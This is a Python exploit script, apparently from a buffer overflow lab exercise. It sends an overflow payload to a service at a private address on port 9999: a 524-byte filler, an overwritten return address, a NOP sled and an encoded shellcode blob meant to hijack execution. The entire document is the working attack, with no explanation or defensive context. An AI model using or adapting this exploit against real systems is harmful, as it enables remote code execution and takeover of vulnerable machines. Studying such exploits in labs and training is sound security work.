import socket

host = "192.168.31.134"
port = 9999

payload = b"\x41" * 524 + b"\xf3\x12\x17\x31" + b"\x90" * 20
buf =  b""
buf += b"\xbe\xf3\xab\x67\x41\xdd\xc6\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x1f\x31\x75\x15\x03\x75\x15\x83\xc5\x04\xe2"
buf += b"\x06\xc1\x6d\x1f\xd9\xcd\x85\x7c\x4a\xb1\x3a\xe9\x6e"
buf += b"\x85\xdb\x64\x8f\x28\xa3\xe0\x14\xdb\x64\xa6\xb5\x9b"
buf += b"\x0d\xb5\xc9\x8a\x91\x30\x28\xc6\x4f\x1b\xfa\x46\xc7"
buf += b"\x12\x1b\x2b\x2a\xa4\x5e\x6c\xcd\xbc\x2e\x19\x13\xd7"
buf += b"\x0c\xe1\x6b\x27\x08\x88\x6b\x4d\xad\xc5\x8f\xa0\x64"
buf += b"\x18\xcf\x46\xb6\xda\x6d\xa3\x11\xaf\x89\x8d\x5d\xdf"
buf += b"\x95\xed\xd4\x3c\x54\x06\xea\x03\xb4\xd5\x42\xfe\xf6"
buf += b"\x66\x27\xc1\x71\x77\x7c\x4b\x60\xee\x30\x6f\xd3\x12"
buf += b"\xf9\xf0\x96\xd5\x79\xf3\x67\x34\xc1\xf2\x97\xb7\x31"
buf += b"\x4e\x96\xb7\x31\xb0\x54\x37"
payload += buf


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print("[-] Connecting to " + host)
    s.connect((host, port))
    s.recv(1024)

    # Send payload
    print("[-] Sending payload ...")
    s.send(payload)
    print("Done")

except Exception as e:
    print(e)
    print("[-] Unable to connect to " + host)